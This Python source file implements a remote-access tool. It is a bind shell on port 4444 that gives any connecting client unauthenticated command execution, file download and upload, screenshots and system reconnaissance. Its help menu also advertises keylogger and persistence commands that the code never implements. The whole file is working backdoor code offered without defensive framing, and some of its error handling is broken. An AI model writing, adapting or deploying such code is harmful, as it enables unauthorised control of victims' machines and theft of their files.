import socket
import subprocess
import os
import threading
import time
from datetime import datetime

class RemoteShell:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = []
        self.lock = threading.Lock()
    
    def start_listener(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.listen(5)
        print(f"[+] Listening on {self.host}:{self.port}")
        
        while True:
            client, addr = s.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            with self.lock:
                self.clients.append((client, addr))
            
            client_handler = threading.Thread(
                target=self.handle_client, 
                args=(client, addr)
            )
            client_handler.daemon = True
            client_handler.start()
    
    def handle_client(self, client, addr):
        client.send(b"[+] Welcome to Remote Shell! Type 'help' for commands.\n")
        
        while True:
            try:
                client.send(b"\n$ ")
                cmd = client.recv(4096).decode('utf-8', errors='ignore').strip()
                
                if cmd.lower() in ['quit', 'exit']:
                    client.send(b"[+] Closing connection...\n")
                    break
                
                elif cmd.lower() == 'help':
                    help_text = """
Available commands:
- help                    Show this help
- screenshot              Take screenshot
- sysinfo                 System information
- keylog [start/stop]     Keylogger control
- persistence [on/off]    Persistence
- shell                   Interactive shell
- download <file>         Download file
- upload <file>           Upload file
- quit/exit               Close connection
"""
                    client.send(help_text.encode())
                    continue
                
                elif cmd.lower() == 'sysinfo':
                    info = self.get_sysinfo()
                    client.send(info.encode())
                    continue
                
                elif cmd.lower() == 'screenshot':
                    screenshot_path = self.take_screenshot()
                    if screenshot_path:
                        client.send(f"[+] Screenshot saved: {screenshot_path}\n".encode())
                    else:
                        client.send(b"[-] Screenshot failed\n")
                    continue
                
                elif cmd.startswith('download '):
                    file_path = cmd[9:].strip()
                    self.send_file(client, file_path)
                    continue
                
                elif cmd.startswith('upload '):
                    file_path = cmd[7:].strip()
                    self.receive_file(client, file_path)
                    continue
                
                # Interactive shell
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, 
                    text=True, timeout=30
                )
                output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}\n"
                client.send(output.encode())
                
            except Exception as e:
                client.send(f"[-] Error: {str(e)}\n".encode())
            except subprocess.TimeoutExpired:
                client.send(b"[-] Command timeout\n")
        
        client.close()
        with self.lock:
            self.clients = [(c, a) for c, a in self.clients if c != client]
        print(f"[-] {addr[0]}:{addr[1]} disconnected")
    
    def get_sysinfo(self):
        try:
            import platform
            import psutil
            info = f"""
[+] System Information:
OS: {platform.system()} {platform.release()}
Architecture: {platform.machine()}
Hostname: {platform.node()}
CPU: {platform.processor()}
RAM: {psutil.virtual_memory().total // (1024**3)} GB total
Uptime: {time.time() - psutil.boot_time():.0f} seconds
"""
            return info
        except:
            return "[+] Sysinfo unavailable\n"
    
    def take_screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = f"screenshot_{timestamp}.png"
            screenshot.save(path)
            return path
        except:
            return None
    
    def send_file(self, client, file_path):
        try:
            if os.path.exists(file_path):
                client.send(f"[+] Sending {file_path} ({os.path.getsize(file_path)} bytes)\n".encode())
                with open(file_path, 'rb') as f:
                    while True:
                        data = f.read(4096)
                        if not data:
                            break
                        client.send(data)
                client.send(b"[+] File transfer complete\n")
            else:
                client.send(b"[-] File not found\n")
        except Exception as e:
            client.send(f"[-] Error: {str(e)}\n".encode())
    
    def receive_file(self, client, file_path):
        try:
            client.send(b"[+] Receiving file, send file content (empty line to finish):\n")
            with open(file_path, 'wb') as f:
                while True:
                    data = client.recv(4096)
                    if not data or data == b'\n':
                        break
                    f.write(data)
            client.send(f"[+] File saved as {file_path}\n".encode())
        except Exception as e:
            client.send(f"[-] Error: {str(e)}\n".encode())

if __name__ == "__main__":
    shell = RemoteShell()
    shell.start_listener()
